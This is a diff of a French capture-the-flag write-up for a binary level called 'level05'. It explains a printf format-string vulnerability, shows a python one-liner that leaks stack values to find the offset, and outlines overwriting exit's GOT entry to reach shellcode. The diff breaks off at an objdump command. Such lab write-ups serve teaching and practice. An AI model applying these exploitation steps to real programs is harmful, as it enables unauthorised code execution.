@@ -2,12 +2,13 @@
 <a href="/level06"><img align='right' width=20x height=auto src="https://cdn.onlinewebfonts.com/svg/img_68680.png"></img></a>
 
 - Il y a une vulnerabilité dans le code source le printf a une variable en tant que format
-- On commence donc par reperer le offset pour ecrire sur une addresse
+- On commence donc par reperer l'offset
 ```
 $> python -c "import struct; print('AAAABBBB' + '%x ' * 11)" | ./level05
 aaaabbbb64 f7f39580 1 0 1 f7f99980 ffffffff 1 0 61616161 62626262
 ```
-- Pour executer notre shellcode il faut ecrire par dessus l'adresse de la fonction pour que ca redirige vers notre shellcode
+- Pour que notre shellcode s'execute il faut rediriger la fonction exit vers celui ci
+- On recupere donc l'addresse d'exit
 <pre>
 $> objdump -R ./level05 
 
